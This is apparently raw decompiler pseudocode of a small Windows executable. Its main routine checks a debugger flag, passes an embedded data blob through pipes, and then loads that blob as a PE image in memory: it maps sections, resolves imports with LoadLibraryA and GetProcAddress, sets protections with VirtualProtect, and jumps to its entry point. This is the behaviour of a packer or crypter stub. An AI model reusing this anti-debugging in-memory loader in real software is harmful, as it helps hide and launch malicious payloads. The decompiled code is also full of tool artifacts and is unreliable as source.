__size32 global39;// 4 bytes
__size32 global40;// 4 bytes
__size32 global41;// 4 bytes
__size32 global42;// 4 bytes
unsigned int global46 = 0xa408;

void _start(__size32 param1);
__size32 proc2();
__size32 proc3(__size32 *param1, __size32 param2, unsigned int param3);
void proc4(HANDLE *param1);
__size32 proc5(__size32 param1);
__size8 proc6(unsigned char *param1, unsigned char *param2, __size32 param3);
__size8 proc7(unsigned int param1, __size32 param2, __size32 param3, __size8 param4);
__size8 proc8(unsigned int param1, union { unsigned int x47; void * x48; } param2, unsigned short param3, __size32 param4, __size32 *param5);
unsigned short proc9(int param1);
void proc10();
__size8 proc11(unsigned char *param1, unsigned char *param2, __size32 param3);
int proc12(int param1);
void proc13();

// address: 0x3e1320
__size32 proc1(__size32 param1) {
    __size8 al; 		// r8
    __size8 cl; 		// r9
    __size16 cx; 		// r1
    __size16 dx; 		// r2
    __size32 eax; 		// r24
    __size32 eax_1; 		// r24{10}
    void *ebp; 		// r29
    void *ebp_1; 		// r29{115}
    void *ebp_2; 		// r29{151}
    void *ebp_3; 		// r29{211}
    void *ebp_4; 		// r29{228}
    void *ebp_5; 		// r29{247}
    int ecx; 		// r25
    int edx; 		// r26
    int esp; 		// r28
    void *esp_1; 		// r28{19}
    __size32 *esp_2; 		// r28{151}
    union { int x56; __size32 * x57; } *esp_3; 		// r28{211}
    __size32 esp_4; 		// r28{247}
    __size32 local0; 		// m[esp - 56]
    __size32 local23; 		// m[esp - 4]
    void *local29; 		// ebp_2{290}
    void *local30; 		// ebp_2{303}

    ebp = esp - 4;
    eax_1 = proc2();
    local30 = ebp;
    local30 = ebp;
    local30 = ebp;
    local0 = *(eax_1 + 48);
    esp_1 = (esp - 52);
    eax = *(unsigned char*)(local0 + 2);
    if (eax == 0) {
        global39 = 0x12d8;
        global39 += 0x4bec;
        global40 = 0x21f8;
        global40 += 0x2b09;
        global41 = 0x52ef;
        global42 = 1574;
        global42 += 0x17fa;
        eax = CreatePipe(); /* Warning: also results in esp_1 */
        if (eax != 0) {
            eax = CreatePipe(); /* Warning: also results in esp_1 */
            if (eax != 0) {
                eax = CreateThread();
                ebp_1 = proc3(&param1, 0x3e3000, global46 / 4);
                proc4(ebp_1 - 20);
                proc4(ebp_1 - 32);
                edx = *(ebp_1 - 36);
                CloseHandle(edx);
                eax = proc5(0x3e3000); /* Warning: also results in esp_2, ebp_2 */
                local29 = ebp_2;
                esp = esp_2 + 4;
                *(__size32*)(ebp_2 - 12) = eax;
                if (*(ebp_2 - 12) != 0) {
                    eax = *(ebp_2 - 12);
                    ecx = *(eax + 52);
                    *(__size32*)(ebp_2 - 44) = ecx;
                    *(__size32*)esp_2 = *(ebp_2 - 12);
                    edx = *esp_2;
                    *(__size32*)esp_2 = *(edx + 84);
                    eax = *esp_2;
                    *(__size32*)esp_2 = eax;
                    ecx = *(ebp_2 - 44);
                    *(__size32*)(esp_2 - 4) = ecx;
                    *(__size32*)(esp_2 - 8) = 0x3e3000;
                    cl = proc6(*(esp_2 - 8), *(esp_2 - 4), *esp_2);
                    *(__size32*)esp_2 = *(ebp_2 - 44);
                    edx = *esp_2;
                    *(__size32*)esp_2 = edx;
                    *(__size32*)(esp_2 - 4) = 0x3e3000;
                    eax = *(ebp_2 - 12);
                    *(__size32*)(esp_2 - 8) = eax;
                    cl = proc7(*(esp_2 - 8), *(esp_2 - 4), cl, *esp_2);
                    *(__size32*)esp_2 = *(ebp_2 - 44);
                    ecx = *esp_2;
                    *(__size32*)esp_2 = ecx;
                    eax = proc5(*esp_2); /* Warning: also results in esp_3, ebp_3 */
                    local29 = ebp_3;
                    esp = esp_3 + 4;
                    *(__size32*)(ebp_3 - 40) = eax;
                    if (*(ebp_3 - 40) != 0) {
                        edx = *(ebp_3 - 44);
                        *(union { int x56; __size32 * x57; }*)esp_3 = edx;
                        eax = *(ebp_3 - 40);
                        *(__size32*)(esp_3 - 4) = eax;
                        al = proc8(*(esp_3 - 60), *(esp_3 - 48), *(esp_3 - 44), *(esp_3 - 4), *esp_3); /* Warning: also results in ebp_4 */
                        *(__size32*)(esp_3 + 4) = *(ebp_4 - 44);
                        ecx = *(esp_3 + 4);
                        *(__size32*)(esp_3 + 4) = ecx;
                        *(union { int x56; __size32 * x57; }*)esp_3 = *(ebp_4 - 40);
                        edx = *esp_3;
                        *(union { int x56; __size32 * x57; }*)esp_3 = edx;
                        cx = proc9(*esp_3); /* Warning: also results in dx, esp_4, ebp_5 */
                        eax = *(ebp_5 - 24);
                        ecx = *(ebp_5 - 44);
                        *(__size32*)(eax + 8) = ecx;
                        edx = *(ebp_5 - 12);
                        *(__size32*)(esp_4 + 4) = *(ebp_5 - 44);
                        eax = *(esp_4 + 4);
                        eax += *(edx + 40);
                        *(__size32*)(ebp_5 - 48) = eax;
                        (**(ebp_5 - 48))(pc, esp - 24, 0x3e3000, pc, 0x3e3000, 0, 0x3e1207, (esp - 36), 0, (esp - 12), esp - 24, (esp - 32), 0, 16, esp - 36, (esp - 20), 0, 16, eax, local0, param1, eax_1, ebp, cx, dx, al, cl, eax, ecx, edx, ebp_5, ADDFLAGS32(eax, *(edx + 40), eax), ADDFLAGS32(eax, *(edx + 40), eax), ADDFLAGS32(eax, *(edx + 40), eax));
                        local29 = ebp_2;
                    }
                }
                ebp_2 = local29;
                esp_1 = proc10();
                local30 = ebp_2;
            } else {
            }
        } else {
        }
    } else {
    }
    ebp_2 = local30;
    *(void **)(esp_1 - 4) = ebp_2;
    esp = *(esp_1 - 4);
    ebp = *(esp + 4);
    return 0; /* WARNING: Also returning: ebp := ebp */
}

// address: 0x3e14d3
void _start(__size32 param1) {
    __size32 eax; 		// r24
    void *ebp; 		// r29
    int esp; 		// r28

    eax = proc1(param1); /* Warning: also results in esp, ebp */
    *(__size32*)(ebp - 4) = eax;
    *(__size32*)(esp - 4) = *(ebp - 4);
    eax = *(esp - 4);
    *(__size32*)(esp - 4) = eax;
    ExitProcess(*(esp - 4));
    return;
}

// address: 0x3e14f0
__size32 proc2() {
    __size32 eax; 		// r24

    eax = *24;
    return eax;
}

// address: 0x3e11a0
__size32 proc3(__size32 *param1, __size32 param2, unsigned int param3) {
    __size32 eax; 		// r24
    __size32 ebp; 		// r29
    __size32 ecx; 		// r25
    int esp; 		// r28
    union { void * x1; int x2; } esp_1; 		// r28{5}
    void *esp_2; 		// r28{69}
    union { void * x1; int x2; } esp_3; 		// r28{83}
    unsigned int local0; 		// m[esp - 16]
    union { void * x1; int x2; } local4; 		// esp_3{83}

    esp_1 = esp - 16;
    local0 = 0;
    local4 = esp_1;
    esp_3 = local4;
    *(unsigned int*)(esp_3 - 4) = local0;
    ecx = *(esp_3 - 4);
    while (ecx < param3) {
        *(__size32*)(esp_3 - 4) = 0;
        *(union { void * x62; int x63; }*)(esp_3 - 8) = (esp - 8);
        *(__size32*)(esp_3 - 12) = 8;
        *(__size32*)(esp_3 - 16) = param2 + local0 * 4;
        *(__size32 **)(esp_3 - 20) = param1;
        eax = *(esp_3 - 20);
        *(__size32*)(esp_3 - 20) = *(eax + 4);
        ecx = *(esp_3 - 20);
        *(__size32*)(esp_3 - 20) = ecx;
        WriteFile(*(esp_3 - 20), *(esp_3 - 16), *(esp_3 - 12), *(esp_3 - 8), *(esp_3 - 4));
        *(__size32*)(esp_3 - 4) = 0;
        *(union { void * x64; int x65; }*)(esp_3 - 8) = (esp - 12);
        *(__size32*)(esp_3 - 12) = 8;
        *(__size32*)(esp_3 - 16) = param2;
        ecx = *(esp_3 - 16);
        *(__size32*)(esp_3 - 16) = ecx + local0 * 4;
        ecx = *param1;
        *(__size32*)(esp_3 - 20) = ecx;
        esp_2 = ReadFile();
        local4 = esp_2;
        local0 += 2;
        esp_3 = local4;
        *(unsigned int*)(esp_3 - 4) = local0;
        ecx = *(esp_3 - 4);
    }
    *(union { void * x66; int x67; }*)(esp_3 - 4) = (esp - 4);
    esp = *(esp_3 - 4);
    ebp = *(esp + 4);
    return ebp;
}

// address: 0x3e1300
void proc4(HANDLE *param1) {
    HANDLE local0; 		// m[esp - 8]

    local0 = *param1;
    CloseHandle(local0);
    local0 = *(param1 + 4);
    CloseHandle(local0);
    return;
}

// address: 0x3e1000
__size32 proc5(__size32 param1) {
    __size32 edx; 		// r26
    __size32 local0; 		// m[esp]

    edx = param1 + *(param1 + 60);
    return edx; /* WARNING: Also returning: ebp := local0 */
}

// address: 0x3e1021
__size8 proc6(unsigned char *param1, unsigned char *param2, __size32 param3) {
    __size8 cl; 		// r9

    cl = proc11(param2, param1, param3);
    VirtualProtect();
    return cl;
}

// address: 0x3e1500
__size8 proc7(unsigned int param1, __size32 param2, __size32 param3, __size8 param4) {
    __size8 cl; 		// r9
    unsigned short dx; 		// r2
    unsigned int eax; 		// r24
    unsigned int eax_1; 		// r24{20}
    int ecx; 		// r25
    unsigned char *ecx_1; 		// r25
    unsigned char *ecx_2; 		// r25{93}
    unsigned int edx; 		// r26
    unsigned short local0; 		// m[esp - 20]
    unsigned int local1; 		// m[esp - 48]
    unsigned int local2; 		// m[esp - 44]
    __size8 local5; 		// param4{143}

    dx = *(param1 + 6);
    eax_1 = param1 + 248;
    local0 = 0;
    local5 = param4;
    param4 = local5;
    edx = (local0);
    while ((int)edx < (int)(dx)) {
        ecx = (local0);
        local1 = *(ecx * 40 + eax_1 + 8);
        ecx = (local0);
        eax = *(ecx * 40 + eax_1 + 16);
        if (local1 >= eax) {
            local2 = eax;
        } else {
            local2 = local1;
        }
        edx = (local0);
        ecx_2 = param3 + *(edx * 40 + eax_1 + 12);
        edx = (local0);
        ecx_1 = param2 + *(edx * 40 + eax_1 + 20);
        cl = proc11(ecx_2, ecx_1, local2);
        local5 = cl;
        local0++;
        param4 = local5;
        edx = (local0);
    }
    return param4;
}

// address: 0x3e1073
__size8 proc8(unsigned int param1, union { unsigned int x47; void * x48; } param2, unsigned short param3, __size32 param4, __size32 *param5) {
    __size32 *eax; 		// r24
    unsigned int eax_1; 		// r24
    HANDLE eax_2; 		// r24{53}
    __size32 ecx; 		// r25
    __size32 edx; 		// r26
    __size32 *edx_1; 		// r26{24}
    __size32 local0; 		// m[esp]
    int *local1; 		// m[esp - 8]
    unsigned short local10; 		// param3{267}
    union { unsigned int x47; void * x48; } local11; 		// param2{268}
    unsigned int local12; 		// param1{271}
    unsigned short local13; 		// local2{277}
    union { unsigned int x47; void * x48; } local14; 		// local3{278}
    unsigned int local15; 		// local4{281}
    unsigned short local2; 		// m[esp - 36]
    union { unsigned int x47; void * x48; } local3; 		// m[esp - 40]
    unsigned int local4; 		// m[esp - 52]
    LPCSTR local5; 		// m[esp - 44]
    union { unsigned int x47; void * x48; } *local6; 		// m[esp - 16]
    __size32 **local7; 		// m[esp - 24]
    __size32 *local9; 		// m[esp - 20]

    ecx = param4 + 128;
    edx_1 = param5 + *ecx;
    local1 = edx_1;
    local10 = param3;
    local11 = param2;
    local12 = param1;
    param3 = local10;
    param2 = local11;
    param1 = local12;
    local13 = param3;
    local14 = param2;
    local15 = param1;
    while (*(local1 + 12) != 0) {
        edx = param5 + *(local1 + 12);
        eax_2 = LoadLibraryA(edx);
        if (*(local1 + 4) != 0) {
            edx = param5 + *local1;
            local6 = edx;
        } else {
            eax = param5 + *(local1 + 16);
            local6 = eax;
        }
        ecx = param5 + *(local1 + 16);
        local7 = ecx;
L9:
        local2 = local13;
        local3 = local14;
        local4 = local15;
        local10 = local2;
        local11 = local3;
        local12 = local4;
        if (*local6 != 0) {
            proc13();
            if (((unsigned char) eax_2) == 0) {
                eax = param5 + *local6;
                local3 = eax;
                eax = GetProcAddress(eax_2, eax + 2);
                local9 = eax;
            } else {
                local5 = *local6;
                local2 = (unsigned short) local5 & 0xffff;
                eax_1 = (local2);
                eax = GetProcAddress(eax_2, eax_1);
                local9 = eax;
            }
            *(__size32 **)local7 = local9;
            local7++;
            local6++;
            local13 = local2;
            local14 = local3;
            local15 = local4;
            goto L9;
        }
        local1 += 20;
        param3 = local10;
        param2 = local11;
        param1 = local12;
        local13 = param3;
        local14 = param2;
        local15 = param1;
    }
    return (unsigned char) local1; /* WARNING: Also returning: ebp := local0 */
}

// address: 0x3e16a9
unsigned short proc9(int param1) {
    unsigned short cx; 		// r1
    unsigned short cx_1; 		// r1{24}
    __size32 eax; 		// r24
    __size32 *ebp; 		// r29
    int ecx; 		// r25
    int edx; 		// r26
    void *esp; 		// r28
    void *esp_1; 		// r28{10}
    int local0; 		// m[esp - 4]

    ebp = (esp - 4);
    esp_1 = (esp - 32);
    cx = (unsigned short) param1;
    edx = *(unsigned short*)(ebp - 16);
    eax = *(unsigned short*)(ebp - 8);
    while (edx < eax) {
        ecx = *(unsigned short*)(ebp - 16);
        *(__size32*)(esp_1 - 4) = *(ebp - 4);
        edx = *(esp_1 - 4);
        eax = *(ebp + 12);
        eax += *(ecx * 40 + edx + 12);
        *(__size32*)(ebp - 24) = eax;
        ecx = *(unsigned short*)(ebp - 16);
        *(__size32*)(esp_1 - 4) = *(ebp - 4);
        edx = *(esp_1 - 4);
        eax = *(ecx * 40 + edx + 8);
        *(__size32*)(ebp - 28) = eax;
        *(union { __size32 * x68; int x69; }*)(esp_1 - 4) = ebp - 20;
        edx = *(unsigned short*)(ebp - 16);
        eax = *(ebp - 4);
        *(__size32*)(esp_1 - 8) = *(edx * 40 + eax + 36);
        ecx = *(esp_1 - 8);
        *(__size32*)(esp_1 - 8) = ecx;
        eax = proc12(*(esp_1 - 8)); /* Warning: also results in esp, ebp */
        *(__size32*)esp = eax;
        edx = *(ebp - 28);
        local0 = edx;
        eax = *(ebp - 24);
        *(__size32*)(esp - 8) = eax;
        esp_1 = VirtualProtect();
        cx_1 = *(ebp - 16);
        cx = cx_1 + 1;
        *(__size16*)(ebp - 16) = cx_1 + 1;
        edx = *(unsigned short*)(ebp - 16);
        eax = *(unsigned short*)(ebp - 8);
    }
    ebp = *ebp;
    return cx; /* WARNING: Also returning: dx := (unsigned short) edx, ebp := ebp */
}

// address: 0x3e1197
void proc10() {
    return;
}

// address: 0x3e18f3
__size8 proc11(unsigned char *param1, unsigned char *param2, __size32 param3) {
    unsigned char cl; 		// r9
    unsigned char *local0; 		// m[esp + 4]
    unsigned char *local1; 		// m[esp + 8]
    __size32 local2; 		// m[esp + 12]
    __size32 local3; 		// m[esp + 12]{68}
    unsigned char *local4; 		// param1{66}
    unsigned char *local5; 		// param2{67}
    __size32 local6; 		// local3{68}

    local4 = param1;
    local5 = param2;
    local6 = param3;
    param1 = local4;
    param2 = local5;
    local3 = local6;
    local2 = local3 - 1;
    local6 = local2;
    while (local3 != 0) {
        cl = *param2;
        *(unsigned char*)param1 = cl;
        local0 = param1 + 1;
        local1 = param2 + 1;
        local4 = local0;
        local5 = local1;
        param1 = local4;
        param2 = local5;
        local3 = local6;
        local2 = local3 - 1;
        local6 = local2;
    }
    return (unsigned char) local3 - 1;
}

// address: 0x3e15d1
int proc12(int param1) {
    __size32 local0; 		// m[esp]

    if ((param1 & 0x4000000) != 0) {
    }
    if ((param1 & 0x20000000) == 0) {
        if ((param1 & 0x40000000) == 0) {
            if ((param1 & 0x80000000) == 0) {
            } else {
            }
        } else {
            if ((param1 & 0x80000000) == 0) {
            } else {
            }
        }
    } else {
        if ((param1 & 0x40000000) == 0) {
            if ((param1 & 0x80000000) == 0) {
            } else {
            }
        } else {
            if ((param1 & 0x80000000) == 0) {
            } else {
            }
        }
    }
    return 0; /* WARNING: Also returning: ebp := local0 */
}

// address: 0x3e1060
void proc13() {
    return;
}

